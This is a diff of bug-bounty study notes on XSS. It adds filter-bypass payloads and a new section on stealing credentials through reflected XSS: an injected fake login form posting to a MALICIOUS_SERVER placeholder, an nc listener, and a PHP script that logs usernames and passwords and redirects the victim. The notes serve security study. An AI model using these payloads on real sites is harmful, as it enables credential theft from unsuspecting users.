@@ -1,7 +1,7 @@
 # Xss
 
-## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Theory
-### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="40" height="20"> types
+# THEORY
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Types
 #### Stored (Persistent) 
 XSS 	The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)
 
@@ -13,7 +13,7 @@ Occurs when user input is displayed on the page after being processed by the bac
 XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)
 
 
-### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="40" height="20"> Source & Sink
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Source & Sink
 
 To further understand the nature of the DOM-based XSS vulnerability, we must understand the concept of the Source and Sink of the object displayed on the page. The Source is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.
 
@@ -115,7 +115,7 @@ For example, this will trigger a xss on error, which will occur because src is e
 python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
 ```
 
-## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> xss bypass
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Xss bypass
 ### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="40" height="20"> innerHTML 
 The innerHTML function does not allow the use of the <script> tags within it as a security feature
 ```javascript
@@ -126,7 +126,7 @@ As alternative it can be used something like
 <img src="" onerror=alert(window.origin)>
 ```
 
-### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="40" height="20"> else
+### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="40" height="20"> Malformed tags
 ```js
 <<a|ascript>alert('xss')</script>
 ```
@@ -172,6 +172,38 @@ Searching for allowed tags to be inserted in the search field as parameter
 - [Two solutions for the January 2021 Initigriti XSS Challenge](https://www.youtube.com/watch?v=Wbovgw3Qxxc)
 ```
 onmouseover=alert(document.location.has.substring(1))#payloadhere
+```
+## Stealing username and password with reflected xss
+- find a vulnerable page to xss
+- inject the following code as payload
+```
+document.write('<h3>Please login to continue</h3><form action=http://MALICIOUS_SERVER><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+```
+- add ```document.getElementById('urlform').remove();``` to remove some elements to force the person to login. 
+- send the malicious link and let the server to send back to your malicious server the credentials 
+#### Malicious listening server:
+```bash
+sudo nc -lvnp 80
+```
+Alternatively, 
+Use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections
+```php
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
+```
+```bash
+@htb[/htb]$ mkdir /tmp/tmpserver
+@htb[/htb]$ cd /tmp/tmpserver
+@htb[/htb]$ vi index.php #at this step we wrote our index.php file
+@htb[/htb]$ sudo php -S 0.0.0.0:80
+PHP 7.4.15 Development Server (http://0.0.0.0:80) started
 ```
 
 ## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80">  Exploiting DOM clobbering to enable XSS
